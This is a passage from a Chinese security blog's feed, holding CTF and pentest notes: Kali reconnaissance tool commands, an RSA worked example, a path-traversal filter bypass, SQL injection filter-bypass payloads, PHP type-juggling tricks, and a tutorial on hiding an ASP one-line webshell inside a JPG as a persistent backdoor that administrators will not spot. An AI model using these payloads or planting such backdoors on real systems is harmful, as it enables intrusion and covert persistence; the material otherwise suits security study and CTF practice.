src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/9.png" alt></p><p>再一个例子，通过dmitry 来扫描网站端口</p><pre><code>#dmitry -p baidu.com -f -b</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/3.jpg" alt></p><h3 id="Maltego"><a href="#Maltego" class="headerlink" title="Maltego"></a>Maltego</h3><p>Maltego是一个开源的取证工具。它可以挖掘和收集信息。</p><p>Maltego是一个图形界面。</p><p>Maltego的基础网络特点：</p><pre><code>1. 域名2. DNS3. Whois4. IP地址5. 网络块</code></pre><p>也可以被用于收集相关人员的信息：</p><pre><code>1. 公司、组织2. 电子邮件3. 社交网络关系4. 电话号码</code></pre><h3 id="theharvester"><a href="#theharvester" class="headerlink" title="theharvester"></a>theharvester</h3><p>theharvester是一个电子邮件，用户名和主机名/子域名信息收集工具。它收集来自各种公开的信息来源。最新版本支持的信息来源包括：</p><pre><code>1. Google2. Google profiles3. Bing4. PGP5. LinkedIn6. Yandex7. People1238. Jigsaw</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/4.jpg" alt></p><p>通过bing来收集</p><pre><code>#theharvester -d baidu.com -l 100 -b bing</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/5.jpg" alt></p><p>如果我们想收集目标用户名，我们可以通过LinkedIn.com查找。命令如下：</p><pre><code>#theharvester -d baidu.com -l 100 -b  linkedin</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/6.jpg" alt></p><h3 id="Metagoofil"><a href="#Metagoofil" class="headerlink" title="Metagoofil"></a>Metagoofil</h3><p>Metagoofil是一款利用Google收集信息的工具，目前支持的类型如下：</p><pre><code>1. word2. ppt3. Excel4. PDF</code></pre><p>命令：</p><pre><code>#metagoofil -d baidu.com -l 20 -t doc,pdf -n 5  -f test.html -o test</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/7.jpg" alt></p><p>通过这个工具我们可以看到收集到的资料非常多，如，用户名，路径信息。我们可以通过这些用户名进行暴力破解。</p><p>通过生成的HTML版的报告，我们可以非常清晰的看到我们收集的信息种类：</p><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/8.jpg" alt></p><p>至此，我们的信息收集工具介绍已经完成。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;信息收集的方式可以分为两种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;主动和被动。主动的信息收集方式：通过直接访问、扫描网站，这种将流量流经网站的行为。&lt;/li&gt;
&lt;li&gt;被动的信息收集方式：利用第三方的服务对目标进行访问了解，比例：Google搜索。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="kali" scheme="http://black0saturday.github.io/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>初学RSA</title>
    <link href="http://black0saturday.github.io/2018/12/03/%E5%88%9D%E5%AD%A6RSA/"/>
    <id>http://black0saturday.github.io/2018/12/03/初学RSA/</id>
    <published>2018-12-03T06:22:55.000Z</published>
    <updated>2020-04-11T07:40:09.064Z</updated>
    
    <content type="html"><![CDATA[<p>现代密码学里面有对称加密和非对称加密。</p><p><strong>对称加密：</strong>指的就是加、解密使用的同是一串密钥，所以被称做对称加密。对称加密只有一个密钥作为私钥。 </p><blockquote><p>常见的对称加密算法：DES，AES等。</p></blockquote><p><strong>非对称加密：</strong>指的是加、解密使用不同的密钥，一把作为公开的公钥，另一把作为私钥。公钥加密的信息，只有私钥才能解密。反之，私钥加密的信息，只有公钥才能解密。 </p><blockquote><p>非对称加密算法：RSA</p></blockquote><a id="more"></a><hr><p>接下来详细学习一下RSA算法。</p><h2 id="第一步：生成密钥对，即公钥和私钥。"><a href="#第一步：生成密钥对，即公钥和私钥。" class="headerlink" title="第一步：生成密钥对，即公钥和私钥。"></a>第一步：生成密钥对，即公钥和私钥。</h2><h3 id="1：随机找两个质数-P-和-Q-P-与-Q-越大，越安全。"><a href="#1：随机找两个质数-P-和-Q-P-与-Q-越大，越安全。" class="headerlink" title="1：随机找两个质数 P 和 Q ,P 与 Q 越大，越安全。"></a>1：随机找两个质数 P 和 Q ,P 与 Q 越大，越安全。</h3><p>比如 P = 67 ，Q = 71。计算他们的乘积 n = P * Q = 4757 ，转化为二进为 1001010010101，该加密算法即为 13 位，实际算法是 1024 位 或 2048 位，位数越长，算法越难被破解。</p><h3 id="2：计算-n-的欧拉函数-φ-n-。"><a href="#2：计算-n-的欧拉函数-φ-n-。" class="headerlink" title="2：计算 n 的欧拉函数 φ(n)。"></a>2：计算 n 的欧拉函数 φ(n)。</h3><p>φ(n) 表示在小于等于 n 的正整数之中，与 n 构成互质关系的数的个数。例如：在 1 到 8 之中，与 8 形成互质关系的是1、3、5、7，所以 φ(n) = 4。 如果 n = P <em> Q，P 与 Q 均为质数，则 φ(n) = φ(P </em> Q)= φ(P - 1)φ(Q - 1) = (P - 1)(Q - 1) 。 本例中 φ(n) = 66 * 70 = 4620，这里记为 m， m = φ(n) = 4620</p><h3 id="3：随机选择一个整数-e，条件是1-lt-e-lt-m，且-e-与-m-互质。"><a href="#3：随机选择一个整数-e，条件是1-lt-e-lt-m，且-e-与-m-互质。" class="headerlink" title="3：随机选择一个整数 e，条件是1&lt; e &lt; m，且 e 与 m 互质。"></a>3：随机选择一个整数 e，条件是1&lt; e &lt; m，且 e 与 m 互质。</h3><p>公约数只有 1 的两个整数，叫做互质整数，这里我们随机选择 e = 101 请注意不要选择 4619，如果选这个，则公钥和私钥将变得相同。</p><h3 id="4：有一个整数-d，可以使得-e-d-除以-m-的余数为-1。"><a href="#4：有一个整数-d，可以使得-e-d-除以-m-的余数为-1。" class="headerlink" title="4：有一个整数 d，可以使得 e*d 除以 m 的余数为 1。"></a>4：有一个整数 d，可以使得 e*d 除以 m 的余数为 1。</h3><p>即找一个整数 d，使得 (e <em> d ) % m = 1。 等价于 e </em> d - 1 = y <em> m ( y 为整数） 找到 d ，实质就是对下面二元一次方程求解。 e </em> x - m * y =1 ，其中 e = 101，m = 4620 101x - 4620y =1 这个方程可以用”扩展欧几里得算法”求解，此处省略具体过程。 总之算出一组整数解（x，y ）= （ 1601，35），即 d = 1601。 到此密钥对生成完毕。不同的 e 生成不同的 d，因此可以生成多个密钥对。</p><p>本例中公钥为 （n，e) = (4757 , 101)，私钥为 （n，d) = (4757 ，1601) ，仅（n，e) = (4757 , 101) 是公开的，其余数字均不公开。可以想像如果只有 n 和 e，如何推导出 d，目前只能靠暴力破解，位数越长，暴力破解的时间越长。</p><h2 id="第二步：加密生成密文-。"><a href="#第二步：加密生成密文-。" class="headerlink" title="第二步：加密生成密文 。"></a>第二步：加密生成密文 。</h2><p>比如甲向乙发送汉字“中”，就要使用乙的公钥加密汉字 “中”， 以 utf-8 方式编码为 [e4 b8 ad]，转为 10 进制为 [228,184,173]。要想使用公钥（n，e) = (4757 , 101)加密，要求<strong>被加密的数字必须小于 n，被加密的数字必须是整数</strong>，字符串可以取 ascii 值或unicode值，因此将“中”字折为三个字节 [228,184,173]，分别对三个字节加密。 假设 a 为明文，b 为密文，则按下列公式计算出 b</p><pre><code>a^e % n = b计算 [228,184,173]的密文：228^101 % 4757 = 4296184^101 % 4757 = 2458173^101 % 4757 = 3263</code></pre><p>即 [228,184,173]加密后得到密文 [4296，2458，3263] ，如果没有私钥 d ,神仙也无法从 [4296，2458，3263]中恢复 [228,184,173]。</p><p>解密生成明文。<br>乙收到密文 [4296，2458，3263]，并用自己的私钥（n，d) = (4757 ，1601) 解密。解密公式如下： 假设 a 为明文，b 为密文，则按下列公式计算出 a</p><pre><code>a^d % n = b密文 [4296，2458，3263]的明文如下：4296^1601% 4757 = 2282458^1601% 4757 = 1843263^1601% 4757 = 173</code></pre><p>即密文 [4296，2458，3263] 解密后得到 [228,184,173] 将[228,184,173] 再按 utf-8 解码为汉字 “中”，至此解密完毕。</p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>最后，问题来了，有没有可能在已知 （n，e) 的情况下，推导出 d。<br><br>根据以上密钥对的生成过程：</p><ul><li>如果想知道 d 需要知道欧拉函数 φ(n)</li><li>如果想知道欧拉函数 φ(n) 需要知道 P 和 Q</li><li>要知道 P 和 Q 需要对 n 进行因数分解。</li></ul><p>对于本例中的 4757 你可以轻松进行因数分解，但对于大整数的因数分解，是一件很困难的事情，目前除了暴力破解，还没有更好的办法，如果以目前的计算速度，破解需要50年以上，则这个算法就是安全的。 </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;现代密码学里面有对称加密和非对称加密。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;对称加密：&lt;/strong&gt;指的就是加、解密使用的同是一串密钥，所以被称做对称加密。对称加密只有一个密钥作为私钥。 &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;常见的对称加密算法：DES，AES等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;非对称加密：&lt;/strong&gt;指的是加、解密使用不同的密钥，一把作为公开的公钥，另一把作为私钥。公钥加密的信息，只有私钥才能解密。反之，私钥加密的信息，只有公钥才能解密。 &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;非对称加密算法：RSA&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="密码学" scheme="http://black0saturday.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>str_replace函数导致文件包含漏洞</title>
    <link href="http://black0saturday.github.io/2018/11/30/str-replace%E5%87%BD%E6%95%B0%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>http://black0saturday.github.io/2018/11/30/str-replace函数导致文件包含漏洞/</id>
    <published>2018-11-30T09:22:04.000Z</published>
    <updated>2020-04-11T01:37:48.538Z</updated>
    
    <content type="html"><![CDATA[<p>遇到一个代码审计的题，源码如下：<br><a id="more"></a><br><img src="/2018/11/30/str-replace%E5%87%BD%E6%95%B0%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/1.png" alt></p><p>代码审计发现考察的是str_replace函数过滤不当造成的任意文件包含漏洞。</p><p>仔细观察18行的代码：<br>    return str_replace(‘../‘, ‘’, $language);</p><p>程序仅仅只是将 ../ 字符替换成空，这并不能阻止攻击者进行攻击。<br>例如攻击者使用payload：<code>....//</code> 或者 <code>..././</code> ，在经过程序的 <code>str_replace</code> 函数处理后，都会变成 <code>../</code> ，所以上图程序中的 <code>str_replace</code> 函数过滤是有问题的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;遇到一个代码审计的题，源码如下：&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="http://black0saturday.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入绕过过滤</title>
    <link href="http://black0saturday.github.io/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/"/>
    <id>http://black0saturday.github.io/2018/11/25/SQL注入绕过过滤/</id>
    <published>2018-11-25T08:05:47.000Z</published>
    <updated>2020-04-10T09:07:40.356Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SQL注入经常会遇到过滤的问题，某些关键字被过滤导致注入无法进行下去，这里就总结一下常见的绕过过滤的方法。（本文参考Freebuf文章）</p><a id="more"></a><p>过滤空格应该是最常见的防御措施了，替换空格的方法有很多：</p><h4 id="1-替换空格"><a href="#1-替换空格" class="headerlink" title="1. /**/替换空格"></a>1. /**/替换空格</h4><p><img src="/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/1.png" alt></p><h3 id="2-0x0a字符替换空格"><a href="#2-0x0a字符替换空格" class="headerlink" title="2. 0x0a字符替换空格"></a>2. 0x0a字符替换空格</h3><p>注意:按住alt键+小键盘输入10再松开alt键即可在控制台中输入ascii字符0x0a<br><img src="/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/2.png" alt></p><h3 id="3-0x0b"><a href="#3-0x0b" class="headerlink" title="3. 0x0b"></a>3. 0x0b</h3><p>注意:按住alt键+小键盘输入11再松开alt键即可在控制台中输入ascii字符0x0b</p><p><img src="/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/3.png" alt></p><h3 id="4-0x0c"><a href="#4-0x0c" class="headerlink" title="4. 0x0c"></a>4. 0x0c</h3><p><img src="/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/4.png" alt></p><h3 id="5-0x0d"><a href="#5-0x0d" class="headerlink" title="5. 0x0d"></a>5. 0x0d</h3><p>使用0x0d号字符替换空格，注意:按住alt键+小键盘输入13再松开alt键即可在控制台中输入ascii字符0x0d,但因为在控制台中一旦输入0x0d，就会执行指令，所以这里只在union前输入了一次。</p><p><img src="/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/5.png" alt></p><hr><p>做到这里会不会想到其他可以替换空格的字符呢，fuzz测试一下：</p><pre><code>&lt;?php$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;&apos;, &apos;mysql&apos;);if ($mysqli-&gt;connect_errno) {    die(&quot;could not connect to the database:\n&quot; . $mysqli-&gt;connect_error);}$i=0;while($i++&lt;256){    $sql = &quot;select host,user from user where user=&apos;a&apos;&quot;.chr($i).&quot;union&quot;.chr($i).&quot;select 1,2;&quot;;    $res = $mysqli-&gt;query($sql);    if ($res) {        echo &quot;Ok!:$i:&quot;.chr($i).&quot;&lt;br&gt;&quot;;    }    }$mysqli-&gt;close();?&gt;</code></pre><p>将代码放入网页中访问，显示：<br><img src="/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/6.png" alt></p><p>通过测试可以发现，除了刚才用的还有9号(tab)和160号字符也可以替换空格。<br>32号本来就是空格，35是注释符</p><hr><p>然后如果这些都被过滤了，有没有别的办法</p><h3 id="1-利用括号、反引号"><a href="#1-利用括号、反引号" class="headerlink" title="1. 利用括号、反引号"></a>1. 利用括号、反引号</h3><p><img src="/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/7.png" alt><br>    select host,user from user where user=’a’union(select<code>table_name</code>,<code>table_type</code>from<code>information_schema</code>.<code>tables</code>);<br>利用括号、反引号来隔离sql关键词与库名表名列名，完成了注入。</p><h3 id="2-join语句和子查询的别名来替换逗号"><a href="#2-join语句和子查询的别名来替换逗号" class="headerlink" title="2. join语句和子查询的别名来替换逗号"></a>2. join语句和子查询的别名来替换逗号</h3><p><img src="/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/8.png" alt><br>在这个语句中，我们利用join与别名，成功的避免使用逗号实现了注入：</p><pre><code>select host,user from user where user=&apos;a&apos;union(select*from((select`table_name`from`information_schema`.`tables`where`table_schema`=&apos;mysql&apos;)`a`join(select`table_type`from`information_schema`.`tables`where`table_schema`=&apos;mysql&apos;)b));</code></pre><p>像这种嵌套语句，好像可以多次嵌套，比如：</p><pre><code>select*from(select&apos;1&apos;)a2select*from(select*from(select&apos;1&apos;)a2)a3select*from(select*from(select*from(select&apos;1&apos;)a2)a3)a4select*from(select*from(select*from(select*from(select&apos;1&apos;)a2)a3)a4)a5</code></pre><h3 id="3-绕过反引号"><a href="#3-绕过反引号" class="headerlink" title="3. 绕过反引号"></a>3. 绕过反引号</h3><p>在库名、表名、列名不带空格、<em>、{、}等特殊符号的情况下，语句中的反引号也可以用括号代替<br>    select host,user from user where user=’a’union(select</em>from(((select(table_name)from(information_schema.tables)where(table_schema)=’mysql’)a)join(select(table_type)from(information_schema.tables)where(table_schema)=’mysql’)b));</p><h3 id="4-过滤单引号"><a href="#4-过滤单引号" class="headerlink" title="4. 过滤单引号"></a>4. 过滤单引号</h3><p><strong>如果存在宽字节注入</strong>，那么即使过滤了单引号，我们也可以注入，这时语句变成这样：<br>    select host,user from user where user=’a?’union(select*from(((select(table_name)from(information_schema.tables)where(table_schema)=0x6D7973716C)a)join(select(table_type)from(information_schema.tables)where(table_schema)=0x6D7973716C)b));</p><h3 id="5-其他技巧"><a href="#5-其他技巧" class="headerlink" title="5.其他技巧"></a>5.其他技巧</h3><p>某些web应用只取查询结果的第一行，这时可以使用group_concat()来获取完整数据,例如：</p><pre><code>select host,user from user where user=&apos;a?&apos;union(select*from(((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=0x6D7973716C)a)join(select(table_type)from(information_schema.tables)where(table_schema)=0x6D7973716C)b));</code></pre><p>也可以多加几个条件判断来逐行获取所要的数据：</p><pre><code>select host,user from user where user=&apos;a?&apos;union(select*from(((select(table_name)from(information_schema.tables)where(table_schema)=(0x6D7973716C)and(table_name)!=(0x6462)and(table_name)!=(0x67687478).......)a)join(select(0x77)from(information_schema.tables)where(table_schema)=0x6D7973716C)b));</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;SQL注入经常会遇到过滤的问题，某些关键字被过滤导致注入无法进行下去，这里就总结一下常见的绕过过滤的方法。（本文参考Freebuf文章）&lt;/p&gt;
    
    </summary>
    
    
      <category term="SQL" scheme="http://black0saturday.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>制作图片马</title>
    <link href="http://black0saturday.github.io/2018/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/"/>
    <id>http://black0saturday.github.io/2018/11/20/制作图片马/</id>
    <published>2018-11-20T08:43:18.000Z</published>
    <updated>2020-04-10T09:08:02.698Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打CTF遇到需要图片马的题，现学一下如何制作图片马。<br><a id="more"></a></p><h2 id="0x01-Copy命令"><a href="#0x01-Copy命令" class="headerlink" title="0x01 Copy命令"></a>0x01 Copy命令</h2><p>先准备两个东西：</p><ul><li>1.asp <code>&lt;%eval request(&quot;value&quot;) %&gt;</code> </li><li>1.jpg 随便一个图片</li></ul><p>打开cmd，输入命令：</p><pre><code>copy 1.jpg/b+1.asp/a 2.jpg</code></pre><p><img src="/2018/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/1.png" alt></p><p>然后对比<code>1.png</code>和<code>2.png</code>的源码</p><ul><li><p>1.png<br><img src="/2018/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/3.png" alt="1.png"></p></li><li><p>2.png<br><img src="/2018/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/2.png" alt="2.png"></p></li></ul><p>且<code>2.png</code>可以正常打开，没有影响</p><p>把以下代码放入目标网站，即可按asp执行。</p><pre><code>&lt;% #include files=”2.jpg”%&gt;</code></pre><hr><h2 id="0x02-Uedit32"><a href="#0x02-Uedit32" class="headerlink" title="0x02 Uedit32"></a>0x02 Uedit32</h2><p>我们通常在得到webshell之后都想给自己留个后门，等下次或以后有用得到的时候再进来看看。但如果直接加入一句话木马<code>&lt;%execute request(&quot;value&quot;)%&gt;</code>到asp文件中时，在该页面上就会出错</p><p>然后换个思路，使用插入一句话木马的图片做我们的后门。而且我们如果有足够的权限的话（网站中的文件可写），就直接把网站原有的图片变成后门，然后在那个asp文件中加入调用图片后门的代码：<br>    <!--#include file="图片后门地址"--><br>这样就没有上面的“类型不匹配: ‘execute’”错误了，而且也更好的隐藏了我们的后门。</p><p>当我们直接将一句话木马的asp文件改成jpg或gif文件的时候，这个图片文件是打不开的，很容易被管理员发现。换一种方法：制作可以显示图片内容的图片格式后门。</p><ol><li><p>准备工作： </p><ul><li>1.jpg(随便一张图片)</li><li>一句话木马：<code>&lt;%execute request(&quot;value&quot;)%&gt;</code></li><li>Script标签： <code>&lt;script runat=server language=javascript&gt;内容&lt;/script&gt;</code></li><li>调用后门代码：<code>&lt;!-- #include file=&quot;图片地址&quot;--&gt;</code></li><li>工具：UltraEdit</li></ul></li><li><p>开始制作：<br>使用UltraEdit打开1.jpg文件，找到<code>&lt;%</code>和<code>%&gt;</code> 其中<code>&lt;%</code>的十六进制代码是<code>3E 25</code>,<code>%&gt;</code>的十六进制代码是<code>25 3E</code>，然后把25改成00</p></li></ol><p><img src="/2018/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/1.jpg" alt></p><p>然后将script标签代码<br>    <SCRIPT runat="SERVER" language="JAVASCRIPT">&lt;%execute request(“value”)%&gt;</SCRIPT><br>转换为十六进制，粘贴到1.jpg的十六进制代码的最下面。必须粘贴到最下面，否则就把图片破坏了。<br>最后保存退出，图片后门就做成了。</p><p>注：如果网站的asp网页可以被写入，那将<code>&lt;!--#include file=&quot;1.jpg&quot;--&gt;</code>直接插入到网页中，这样这个网页的url就成了使用菜刀连接的后门地址了；</p><h2 id="0x03-PS插入"><a href="#0x03-PS插入" class="headerlink" title="0x03 PS插入"></a>0x03 PS插入</h2><ol><li>用PS打开一张图片</li><li>点击文件-&gt;文件简介</li><li>然后插入需要的木马代码</li><li>然后保存即可</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;打CTF遇到需要图片马的题，现学一下如何制作图片马。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="http://black0saturday.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>PHP特性总结</title>
    <link href="http://black0saturday.github.io/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/"/>
    <id>http://black0saturday.github.io/2018/11/15/PHP特性总结/</id>
    <published>2018-11-15T08:52:43.000Z</published>
    <updated>2020-04-08T08:27:56.586Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>打CTF经常会遇到代码审计的题目，一般接触到的都是php型的，做的笔记到处都是，这里就准备把它们全总结到一起。<br><a id="more"></a></p><h2 id="一、数组"><a href="#一、数组" class="headerlink" title="一、数组"></a>一、数组</h2><h3 id="0x01-数组的md5"><a href="#0x01-数组的md5" class="headerlink" title="0x01 数组的md5"></a>0x01 数组的md5</h3><p>这个大家应该都知道，md5算法对数组加密结果是NULL。<br>首先判断username和password是否一致，一致的话提示’Your password can not be your username.’。<br>这里就用到了php的一个特性</p><blockquote><p>php对数组进行md5加密返回的结果都是null</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo md5($_GET[&#39;username&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>运行一下</p><p>爆出警告需要一个字符类型的参数，而不是数组</p><p>然后我们测试一下上面那个题，输入<code>username</code>和<code>password</code>都为数组，但是赋值不同</p><p>由于两个的赋值不同，所以通过第一个判断，又由于都是数组，php对其进行md5加密后都返回为NULL,所以通过了第二个判断，输出flag。</p><h3 id="0x02-strcmp-函数"><a href="#0x02-strcmp-函数" class="headerlink" title="0x02 strcmp()函数"></a>0x02 strcmp()函数</h3><p>先看这个代码</p><p>这里使用strcmp去比较password和flag,如果==0，就给出flag。<br>strcmp比较时，如果相等才会返回0，如果不相等返回要么大于0，要么小于0，这里记住一句话：</p><blockquote><p>strcmp函数只会处理字符串参数，如果给个数组，就会返回NULL，而判断使用的是==，<code>NULL==0</code>,这个等式的逻辑值是true。</p></blockquote><p>利用这个漏洞，我们来做这个题</p><h2 id="二、数字的比较"><a href="#二、数字的比较" class="headerlink" title="二、数字的比较"></a>二、数字的比较</h2><h3 id="0x01-十六进制与数字"><a href="#0x01-十六进制与数字" class="headerlink" title="0x01 十六进制与数字"></a>0x01 十六进制与数字</h3><p>还是先看题吧</p><p>代码的意思就是： 不让输入1到9的数字，但是后面却让比较一串数字，这里想到的就是用进制转换，然后再比较。<br>那么将<code>3735929054</code>这串数字转换成十六进制是<code>deadc0de</code>,然后两个进行比较，比较结果当然是相等的，这样就能成功绕过，得到flag</p><h3 id="0x02-数字运算-一"><a href="#0x02-数字运算-一" class="headerlink" title="0x02 数字运算(一)"></a>0x02 数字运算(一)</h3><p>大致意思就是：POST传入password的值，必须大于12位，必须是非空非TAB，然后password要有大小写数字，字符，陪陪次数要大于6，最后要<code>$password==42</code>.</p><p>这里直接给出现成的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;42.00e+00000000000</span><br><span class="line">或者</span><br><span class="line">password&#x3D;420.000000000e-1</span><br></pre></td></tr></table></figure></p><h3 id="0x03-数字运算-二"><a href="#0x03-数字运算-二" class="headerlink" title="0x03 数字运算(二)"></a>0x03 数字运算(二)</h3><p>代码中先将变量放到is_numberic函数中判断，如果是数字或数字字符串则返回true，否则返回false。然后一个判断，如果temp大于1336则显示flag。这里用到了PHP弱类型的一个特性，</p><blockquote><p>当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。</p></blockquote><p>那么输入一个1337a这样的字符串，在is_numeric中返回true，然后在比较时被转换成数字1337，这样就绕过判断输出flag。</p><h3 id="0x04-MD5的巧合-一"><a href="#0x04-MD5的巧合-一" class="headerlink" title="0x04 MD5的巧合(一)"></a>0x04 MD5的巧合(一)</h3><p>输入password，要求其MD5值为0</p><blockquote><p>有一些特定的字符被MD5加密后结果是0e开头的</p></blockquote><p>而URL中0e被当作了科学计数法，0*10的多少次方都是0<br>这样的字符串其实有很多，这里给出几个：</p><blockquote><p>240610708<br>QNKCDZO</p></blockquote><h3 id="0x03-MD5的巧合-二"><a href="#0x03-MD5的巧合-二" class="headerlink" title="0x03 MD5的巧合(二)"></a>0x03 MD5的巧合(二)</h3><p>其中md5运算函数有一个true参数，它的作用是将md5后的hex转换成字符串，这里如果字符串有单引号之类的字符就可以注入了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">比如字符串：ffifdyop</span><br><span class="line">md5后，276f722736c95d99e921722cf9ed621c</span><br></pre></td></tr></table></figure><br>将其转成字符串的话就是</p><p>可以看到起字符串类似于 <code>&#39;or&#39;6………..</code>这样的字符串，其中<code>&#39;or&#39;6</code>是个永真的条件，如果把它放到查询中就可以where语句的判断，比如我们在url输入<code>password=ffifdyop</code>可以看到dump出的数据</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;PHP特性&quot;&gt;&lt;a href=&quot;#PHP特性&quot; class=&quot;headerlink&quot; title=&quot;PHP特性&quot;&gt;&lt;/a&gt;PHP特性&lt;/h1&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;打CTF经常会遇到代码审计的题目，一般接触到的都是php型的，做的笔记到处都是，这里就准备把它们全总结到一起。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="http://black0saturday.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>2018WEB安全测试秋季预选赛</title>
    <link href="http://black0saturday.github.io/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/"/>
    <id>http://black0saturday.github.io/2018/10/28/2018WEB安全测试秋季预选赛/</id>
    <published>2018-10-28T13:31:43.000Z</published>
    <updated>2019-12-30T10:31:51.372Z</updated>
    
